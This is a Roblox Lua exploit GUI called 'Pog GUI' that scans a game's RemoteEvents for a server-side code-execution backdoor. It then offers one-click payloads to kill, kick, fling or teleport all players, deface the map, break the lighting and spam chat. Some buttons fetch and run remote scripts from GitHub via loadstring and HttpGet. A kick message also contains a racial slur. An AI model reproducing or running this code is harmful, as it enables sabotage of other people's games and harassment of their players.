---------- PLEASE DO NOT SHARE THIS SCRIPT WITH ANYBODY IF YOU FOUND IT, THANKS. ----------


-- pog!!! the fastest backdoor scannner and game destroyer
-- v0.9










































































-- Instance:
local Replc = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local UIGradient2 = Instance.new("UIGradient")
local TextLabel = Instance.new("TextLabel")
local ChatService = game:GetService("Chat")
ChatService.BubbleChatEnabled = false
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local TextLabel0 = Instance.new("TextLabel")
local BTN1 = Instance.new("TextButton")
local BTN2 = Instance.new("TextButton")
local BTN3 = Instance.new("TextButton")
local BTN4 = Instance.new("TextButton")
local BTN5 = Instance.new("TextButton")
local BTN6 = Instance.new("TextButton")
local BTN7 = Instance.new("TextButton")
local BTN8 = Instance.new("TextButton")
local BTN70 = Instance.new("TextButton")
local BTN13 = Instance.new("TextButton")
local BTN15 = Instance.new("TextButton")
local BTN17 = Instance.new("TextButton")
local BTN18 = Instance.new("TextButton")
local BTN16 = Instance.new("TextButton")
local BTN14 = Instance.new("TextButton")
local BTN71 = Instance.new("TextButton")
local BTN72 = Instance.new("TextButton")
local BTN69 = Instance.new("TextButton")
local BTN11 = Instance.new("TextButton")
local TextLabel2 = Instance.new("TextLabel")
local BTN9 = Instance.new("TextButton")
local BTN10 = Instance.new("TextButton")
local BTN12 = Instance.new("TextButton")
local TextLabel3 = Instance.new("TextLabel")
local TextLabel4 = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

local RunService = game:GetService("RunService")
local foundEvent = false
local FinishedFound = false

local function testRemote(remote)
    local modelName = "PogG"
    print("Checking RemoteEvent:", remote:GetFullName())
    local function onAdded(instance)
         if instance:IsDescendantOf(workspace) and instance.Name == modelName then
            foundEvent = true
         end
    end

    local connection = workspace.ChildAdded:Connect(onAdded)
    remote:FireServer([[ 
        local model = Instance.new("Message") 
        model.Name = "PogG"
        model.Parent = workspace 
    ]])
    local startTime = tick()
    while tick() - startTime < 0.5 do
        if foundEvent then break end
        RunService.Heartbeat:Wait()
    end
    connection:Disconnect()
    print(foundEvent and "✅ RemoteEvent is exploitable!" or "❌ RemoteEvent failed.")
    return foundEvent
end

local remoteEvent
local remotes = {}
for _, remote in ipairs(game:GetDescendants()) do
    if remote:IsA("RemoteEvent") and remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then
        table.insert(remotes, remote)
    end
end

local index = 1
local function findRemote()
    if remoteEvent then return end
    for i = 1, 10 do
        if index > #remotes then
            FinishedFound = true
            print("❌ Finished scanning. No exploitable RemoteEvent found.")
            return
        end
        local remote = remotes[index]
        index += 1
        if remote.Name ~= "UpdateCurrentCall" and remote.Name ~= "CanChatWith" then 
            if testRemote(remote) then
                remoteEvent = remote
                print("✅ Using RemoteEvent:", remote:GetFullName())
                return
            end
        end
    end
    task.wait(0.05)
    findRemote()
end

task.spawn(findRemote)

local function fireRemoteEvent(code)
    if remoteEvent then
        print("Executing code through:", remoteEvent:GetFullName()) -- Debug print
        remoteEvent:FireServer(code)
    else
        warn("⚠ No exploitable RemoteEvent found, cannot execute code.")
    end
end





-- Original functions modified to use RemoteEvent
local function applyEffectsEverywhere()
    fireRemoteEvent([[
        for _, part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") or part:IsA("MeshPart") then
                for _, face in pairs({"Front", "Back", "Top", "Bottom", "Left", "Right"}) do
                    local decal = Instance.new("Decal")
                    decal.Texture = "rbxassetid://125414307215852"
                    decal.Face = Enum.NormalId[face]
                    decal.Parent = part
                end
            end
        end
    ]])
end

local function changeLighting()
    fireRemoteEvent([[
        while true do
            local correction = Instance.new("ColorCorrectionEffect", game.Lighting)
            correction.Contrast = 100
            correction.Brightness = 0
            correction.TintColor = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
            task.wait(0.2)
            correction:Destroy()
        end
    ]])
end

local function startMusic()
    fireRemoteEvent([[
        local sound = Instance.new("Sound", workspace)
        sound.SoundId = "rbxassetid://132124181828375"
        sound.Volume = 3
        sound.Looped = true
        sound:Play()
    ]])
end

local function createPlayerGui(player)
    fireRemoteEvent([[
        for _, player in pairs(game.Players:GetPlayers()) do
            local playerGui = player:FindFirstChild("PlayerGui")
            if playerGui then
                local screenGui = Instance.new("ScreenGui", playerGui)
                screenGui.Name = "SpawnGui"
                local frame = Instance.new("Frame", screenGui)
                frame.Size = UDim2.new(0.3, 0, 0.2, 0)
                frame.Position = UDim2.new(0.3, 0, 0.35, 0)
                frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                frame.BorderSizePixel = 0
                local textLabel = Instance.new("TextLabel", frame)
                textLabel.Size = UDim2.new(1, 0, 0.7, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                textLabel.TextScaled = true
                textLabel.Text = "game was hacked by ReplicateClientation!!"
                local closeButton = Instance.new("TextButton", frame)
                closeButton.Size = UDim2.new(0.2, 0, 0.15, 0)
                closeButton.Position = UDim2.new(0.4, 0, 0.75, 0)
                closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
                closeButton.Text = "close"
                closeButton.TextColor3 = Color3.fromRGB(20, 20, 20)
                closeButton.TextScaled = true
                closeButton.MouseButton1Click:Connect(function()
                    screenGui:Destroy()
                end)
            end
        end
    ]])
end

local function showHint()
    fireRemoteEvent([[
        local hint = Instance.new("Hint", workspace)
		 local function randomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"
    local result = {}
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        result[i] = chars:sub(randIndex, randIndex)
    end
    return table.concat(result)
end
        while true do
            hint.Text = randomString(200)
            task.wait(0.2)
        end
    ]])
end

local function unanchorRandomParts()
    fireRemoteEvent([[
        while true do
            local parts = {}
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Anchored then
                    table.insert(parts, obj)
                end
            end
            for i = 1, math.min(10, #parts) do
                local part = parts[math.random(#parts)]
                part.Anchored = false
            end
            task.wait(1)
        end
    ]])
end

local function flingPlayer(player)
    fireRemoteEvent([[
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
                    local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        local flingForce = Instance.new("BodyVelocity", rootPart)
                        flingForce.Velocity = Vector3.new(math.random(-150, 150), math.random(-100, 100), math.random(-150, 150))
                        flingForce.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        flingForce.P = 10000
                        game.Debris:AddItem(flingForce, 0.5)
                    end
                end
            end
        end
    ]])
end

local function spawnGiantSpheres()
    fireRemoteEvent([[
        while true do
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local rootPart = player.Character.HumanoidRootPart
                    local sphere = Instance.new("Part", workspace)
                    sphere.Shape = Enum.PartType.Ball
                    sphere.Size = Vector3.new(15, 15, 15)
                    sphere.Position = rootPart.Position + Vector3.new(math.random(-50, 50), 200, math.random(-50, 50))
                    sphere.Anchored = false
                    sphere.Color = Color3.new(1, 0, 0)
                end
            end
            task.wait(1)
        end
    ]])
end

local function spamTeams()
    fireRemoteEvent([[

		for i = 1, 50 do
		    local function randomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"
    local result = {}
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        result[i] = chars:sub(randIndex, randIndex)
    end
    return table.concat(result)
end
			        local team = Instance.new("Team", game:GetService("Teams"))
            team.Name = randomString(50)
            team.TeamColor = BrickColor.random()
            team.AutoAssignable = true
            for _, player in pairs(game.Players:GetPlayers()) do
                player.Team = team
            end
		end
    ]])
end

-- Button click handlers
BTN1.MouseButton1Click:Connect(applyEffectsEverywhere)
BTN2.MouseButton1Click:Connect(changeLighting)
BTN3.MouseButton1Click:Connect(startMusic)
BTN4.MouseButton1Click:Connect(createPlayerGui)
BTN5.MouseButton1Click:Connect(showHint)
BTN6.MouseButton1Click:Connect(spawnGiantSpheres)
BTN7.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        local sky = Instance.new("Sky", game.Lighting)
        sky.SkyboxBk = "rbxassetid://78425812394777"
        sky.SkyboxDn = "rbxassetid://78425812394777"
        sky.SkyboxFt = "rbxassetid://78425812394777"
        sky.SkyboxLf = "rbxassetid://78425812394777"
        sky.SkyboxRt = "rbxassetid://78425812394777"
        sky.SkyboxUp = "rbxassetid://78425812394777"
    ]])
end)
BTN8.MouseButton1Click:Connect(unanchorRandomParts)
BTN70.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, player in pairs(game.Players:GetPlayers()) do
            player:Kick("Restarting Niggas")
        end
    ]])
end)
BTN72.MouseButton1Click:Connect(function()
    fireRemoteEvent([[

		for _, player in pairs(game.Players:GetPlayers()) do
            require(129414474541336).accgun(player.Name)
        end
    ]])
end)
BTN71.MouseButton1Click:Connect(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/vulnerability.lua"))()
end)
BTN13.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character then
                player.Character.Humanoid.WalkSpeed = 50
                player.Character.Humanoid.JumpPower = 100
            end
        end
    ]])
end)
-- Helper function to style buttons uniformly
local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
    btn.BackgroundTransparency = 0.5
    btn.BorderSizePixel = 0
    btn.Size = UDim2.new(0, 250, 0, 50)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.TextStrokeTransparency = 0
    btn.TextWrapped = true
	local btnC = Instance.new("UICorner")
	btnC.Parent = btn

    local btnUIStroke = Instance.new("UIStroke")
    btnUIStroke.Color = Color3.fromRGB(32,32,32)
    btnUIStroke.Thickness = 2
	btnUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    btnUIStroke.Parent = btn
end
BTN14.MouseButton1Click:Connect(spamTeams)
BTN15.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        local TeleportService = game:GetService("TeleportService")
        local targetPlaceId = 127155175736200
        for _, player in pairs(game.Players:GetPlayers()) do
            TeleportService:Teleport(targetPlaceId, player)
        end
    ]])
end)
BTN16.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character then
                player.Character.Humanoid.Health = 0
            end
        end
    ]])
end)
BTN17.MouseButton1Click:Connect(function()
    if game:GetService("TextChatService"):FindFirstChild("TextChannels") and game.TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
            game.TextChatService.TextChannels.RBXGeneral:SendAsync("ReplicateClientation fixed this game 👍")
        elseif game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ReplicateClientation fixed this game 👍", "All")
        end
end)
BTN18.MouseButton1Click:Connect(flingPlayer)
BTN9.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Message") or obj:IsA("Hint") then
                obj:Destroy()
            end
        end
    ]])
end)
BTN10.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, obj in pairs(game.Lighting:GetDescendants()) do
            if obj:IsA("ColorCorrectionEffect") or obj:IsA("Sky") then
                obj:Destroy()
            end
        end
    ]])
end)
BTN69.MouseButton1Click:Connect(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/R6Car.lua"))()
end)
BTN11.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        local sky = Instance.new("Sky", game.Lighting)
        sky.SkyboxBk = "rbxassetid://117947166238712"
        sky.SkyboxDn = "rbxassetid://117947166238712"
        sky.SkyboxFt = "rbxassetid://117947166238712"
        sky.SkyboxLf = "rbxassetid://117947166238712"
        sky.SkyboxRt = "rbxassetid://117947166238712"
        sky.SkyboxUp = "rbxassetid://117947166238712"
    ]])
end)
local menuVisible = true
ToggleButton.MouseButton1Click:Connect(function()
    menuVisible = not menuVisible
    Frame.Visible = menuVisible
end)

BTN12.MouseButton1Click:Connect(function()
    fireRemoteEvent([[
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Message") or obj:IsA("Hint") or obj:IsA("Decal") or obj:IsA("BillboardGui") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Fire") or obj:IsA("SelectionBox") or obj:IsA("Sound") or obj:IsA("PointLight") or obj:IsA("SurfaceLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceGui") or obj:IsA("ScreenGui") or obj:IsA("Explosion") or obj:IsA("Tool") or obj:IsA("Forcefield") or obj:IsA("Sparkle") or obj:IsA("Highlight") then
                obj:Destroy()
            end
        end
        for _, obj in pairs(game.Lighting:GetDescendants()) do
            if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("Sky") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") or obj:IsA("Atmosphere") or obj:IsA("DepthOfFieldEffect") then
                obj:Destroy()
            end
        end
        game.Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        game.Lighting.Brightness = 3
        game.Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        game.Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
        game.Lighting.ClockTime = 14
        game.Lighting.GeographicLatitude = 41.733
        game.Lighting.FogColor = Color3.fromRGB(192, 192, 192)
        game.Lighting.FogEnd = 10000
        game.Lighting.FogStart = 0
        game.Lighting.GlobalShadows = true
        game.Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        game.Lighting.ExposureCompensation = 0
    ]])
end)
-- Upgraded UI layout and styling
	Replc.Name = "Replc"

    local targetPlayer = game.Players.LocalPlayer
    if targetPlayer then
        Replc.Parent = targetPlayer.PlayerGui
    else
        warn("Player" .. " not found")
    end
Replc.ResetOnSpawn = false
Replc.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = Replc
Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)  -- Dark background
Frame.BackgroundTransparency = 0.2
Frame.BorderSizePixel = 0
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)

Frame.Size = UDim2.new(0, 300, 0, 450)
local fC = Instance.new("UICorner")
fC.Parent = Frame

UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(153,0,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
})
UIGradient.Parent = Frame
UIGradient.Transparency = NumberSequence.new(0) -- Fully opaque gradient
UIGradient.Rotation = 90



TextLabel.Parent = Frame
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(1, 0, 0, 50)
TextLabel.Text = "Pog GUI v1.1"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 25
TextLabel.TextStrokeTransparency = 0
TextLabel.TextWrapped = true

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Position = UDim2.new(0.03, 0, 0.12, 0)
ScrollingFrame.Size = UDim2.new(0, 275, 0, 380)
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.BorderSizePixel = 0

UIGradient2.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(153,0,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
})
UIGradient2.Parent = ScrollingFrame
UIGradient2.Transparency = NumberSequence.new(0) -- Fully opaque gradient
UIGradient2.Rotation = 90

UIListLayout.Parent = ScrollingFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)

TextLabel0.Parent = ScrollingFrame
TextLabel0.BackgroundTransparency = 1
TextLabel0.Size = UDim2.new(1, 0, 0, 50)
TextLabel0.Text = "Checking for backdoor... (Can take some time)"
TextLabel0.TextColor3 = Color3.fromRGB(255, 255,255)
TextLabel0.TextScaled = true
TextLabel0.TextStrokeTransparency = 0
TextLabel0.TextWrapped = true
-- Close Button
local cC = Instance.new("UICorner")
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Text = "X"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 10)  -- Top right corner
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.BackgroundTransparency = 0.5
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextScaled = true
CloseButton.BorderSizePixel = 0
CloseButton.Parent = Frame
cC.Parent = CloseButton
-- Add stroke to the close button
local closeButtonStroke = Instance.new("UIStroke")
closeButtonStroke.Color = Color3.fromRGB(32, 32, 32)
closeButtonStroke.Thickness = 2
closeButtonStroke.Parent = CloseButton

-- Functionality to close the GUI
CloseButton.MouseButton1Click:Connect(function()
    Replc:Destroy()
end)
local function createPog()
   game.StarterGui:SetCore("SendNotification",{
		Title = "Pog GUI",
		Text = "Backdoor found! Time to have fun.."
	})
TextLabel0.Text = "-| Destruction |-"
TextLabel0.TextColor3 = Color3.fromRGB(255, 50, 50)
	styleButton(BTN1)
BTN1.Text = "Infect map w/ ReplicateClientation"
BTN1.Parent = ScrollingFrame

styleButton(BTN2)
BTN2.Text = "Break Lighting"
BTN2.Parent = ScrollingFrame

styleButton(BTN3)
BTN3.Text = "Music"
BTN3.Parent = ScrollingFrame

styleButton(BTN4)
BTN4.Text = "Spawn GUI"
BTN4.Parent = ScrollingFrame

styleButton(BTN5)
BTN5.Text = "Spawn Message"
BTN5.Parent = ScrollingFrame

styleButton(BTN6)
BTN6.Text = "Spawn Spheres"
BTN6.Parent = ScrollingFrame

styleButton(BTN7)
BTN7.Text = "Set ReplicateClientation Sky"
BTN7.Parent = ScrollingFrame

styleButton(BTN8)
BTN8.Text = "Start Unanchoring Parts"
BTN8.Parent = ScrollingFrame

styleButton(BTN70)
BTN70.Text = "Kick All"
BTN70.Parent = ScrollingFrame

styleButton(BTN69)
BTN69.Text = "Car Drift"
BTN69.Parent = ScrollingFrame

styleButton(BTN71)
BTN71.Text = "Modified LALOL"
BTN71.Parent = ScrollingFrame

styleButton(BTN72)
BTN72.Text = "Give Everyone Acc Gun"
BTN72.Parent = ScrollingFrame

styleButton(BTN15)
BTN15.Text = "TP To realm (probably wont work)"
BTN15.Parent = ScrollingFrame

styleButton(BTN16)
BTN16.Text = "1x1x1x1 reference (kill all)"
BTN16.Parent = ScrollingFrame

styleButton(BTN17)
BTN17.Text = "Say in chat ReplicateClientation fixed this game 👍"
BTN17.Parent = ScrollingFrame
styleButton(BTN18)
BTN18.Text = "Fling everyone"
BTN18.Parent = ScrollingFrame
styleButton(BTN13)
BTN13.Text = "Give powers"
BTN13.Parent = ScrollingFrame

styleButton(BTN14)
BTN14.Text = "Shit with teams"
BTN14.Parent = ScrollingFrame

styleButton(BTN11)
BTN11.Text = "Set Tour Sky"
BTN11.Parent = ScrollingFrame

TextLabel2.Parent = ScrollingFrame
TextLabel2.BackgroundTransparency = 1
TextLabel2.Size = UDim2.new(1, 0, 0, 50)
TextLabel2.Text = "-| Restore |-"
TextLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel2.TextScaled = true
TextLabel2.TextStrokeTransparency = 0
TextLabel2.TextWrapped = true

styleButton(BTN9)
BTN9.Text = "Clear Messages"
BTN9.Parent = ScrollingFrame

styleButton(BTN10)
BTN10.Text = "Clear Color Corrections"
BTN10.Parent = ScrollingFrame

styleButton(BTN12)
BTN12.Text = "Clear everything"
BTN12.Parent = ScrollingFrame
TextLabel3.Parent = ScrollingFrame
TextLabel3.BackgroundTransparency = 1
TextLabel3.Size = UDim2.new(1, 0, 0, 50)
TextLabel3.Text = "-| Updatelog |-"
TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel3.TextScaled = true
TextLabel3.TextStrokeTransparency = 0
TextLabel3.TextWrapped = true

TextLabel4.Parent = ScrollingFrame
TextLabel4.BackgroundTransparency = 1
TextLabel4.Size = UDim2.new(1, 0, 0, 50)
TextLabel4.Text = "fixed kicking because of remote event called UpdateCurrentCall, the ui is now draggable in the time of checking, fixed some glitches, changed font, made SUPER FAST SCANNING!"
TextLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel4.TextScaled = true
TextLabel4.TextStrokeTransparency = 0
TextLabel4.TextWrapped = true
end
styleButton(ToggleButton)
ToggleButton.Parent = Replc
ToggleButton.Size = UDim2.new(0, 80, 0, 50)  -- Small and not too wide  
ToggleButton.Position = UDim2.new(0.093, Frame.Position.X.Scale, 0, Frame.Position.Y.Offset + Frame.Size.Y.Offset + 330) -- Properly below the menu
ToggleButton.Text = "pog"
local eventFoundr
eventFoundr = RunService.Heartbeat:Connect(function()
   if foundEvent then
	   eventFoundr:Disconnect()
	   createPog()
   end
end)

RunService.RenderStepped:Connect(function()
    if TextLabel0.Text == "backdoor not found!!" and fountEvent then
		TextLabel0.Text = "-| Destruction |-"
        TextLabel0.TextColor3 = Color3.fromRGB(255, 50, 50)
	end
end)
	-- Draggable frame functionality remains unchanged
local dragging = false
local dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and (input == dragInput) then
        update(input)
    end
end)
if game:GetService("UserInputService").TouchEnabled then
   Frame.AnchorPoint = Vector2.new(0.5, 0.5)
   Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
end

-- Separate Dragging System for the Toggle Button
local dragging2 = false
local dragInput2, dragStart2, startPos2

local function update2(input)
    local delta2 = input.Position - dragStart2
    ToggleButton.Position = UDim2.new(startPos2.X.Scale, startPos2.X.Offset + delta2.X, startPos2.Y.Scale, startPos2.Y.Offset + delta2.Y)

end

ToggleButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging2 = true
        dragStart2 = input.Position
        startPos2 = ToggleButton.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging2 = false
            end
        end)
    end
end)

ToggleButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput2 = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging2 and (input == dragInput2) then
        update2(input)
    end
end)

repeat task.wait() until FinishedFound or remoteEvent
if not remoteEvent then
    TextLabel0.Text = "backdoor not found!!"
    if game.PlaceId == 10218821851 then
        TextLabel0.Text = "From now on, Every new version of Pog GUI is deprecated for Client Replication, use Pog GUI v0.9 instead for Client Replication."
    end
else
    createPog()
end

